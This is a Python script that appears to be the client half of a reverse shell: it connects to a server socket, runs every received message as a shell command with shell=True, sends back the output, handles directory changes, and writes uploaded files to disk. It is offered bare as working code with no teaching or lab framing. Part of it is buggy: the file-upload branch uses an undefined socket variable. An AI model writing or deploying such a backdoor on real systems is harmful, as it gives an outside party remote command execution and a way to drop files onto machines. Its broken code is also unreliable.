#!/usr/bin/env python3
import socket
import os
import subprocess
import pathlib
import tqdm

HEADER = 64
PORT = 5051
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "exit"
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def execute_command(conn, cmd_str):
    try:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print("Command failed " + cmd_str)
    stdoutput = (proc.stdout.read() + proc.stderr.read()).decode()
    snd_msg(conn, stdoutput)

def snd_msg(conn, msg):
    message = msg.encode(FORMAT)
    length = str(len(message)).encode(FORMAT)
    length += b' ' * (HEADER - len(length))
    conn.send(length)
    conn.send(message)

def listen_to_server(conn):
    print(f"Connected to {SERVER}")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)
            print(msg)

            if msg == DISCONNECT_MESSAGE:
                connected = False
            elif msg[:2] == "cd":
                try:
                    abs_path = os.path.abspath(os.path.join(os.getcwd(), msg[3:]))
                    os.chdir(abs_path)
                    snd_msg(conn, os.getcwd())
                except:
                    snd_msg(conn, "Failed to change directory.")

            elif msg[:3] == "put":
                # receive the file infos
                # receive using client socket, not server socket
                received = client_socket.recv(BUFFER_SIZE).decode()
                filename, filesize = received.split(SEPARATOR)
                print(f'filename: {filename}, fsize: {filesize}')
                # remove absolute path if there is
                filename = os.path.basename(filename)
                # convert to integer
                filesize = int(filesize)

                # start receiving the file from the socket
                # and writing to the file stream
                progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, "wb") as f:
                    while True:
                        # read 1024 bytes from the socket (receive)
                        bytes_read = client_socket.recv(BUFFER_SIZE)
                        if not bytes_read:
                            # nothing is received
                            # file transmitting is done
                            break
                        # write to the file the bytes we just received
                        f.write(bytes_read)
                        # update the progress bar
                        progress.update(len(bytes_read))

            else:
                execute_command(conn, msg)
    conn.close()

listen_to_server(client)
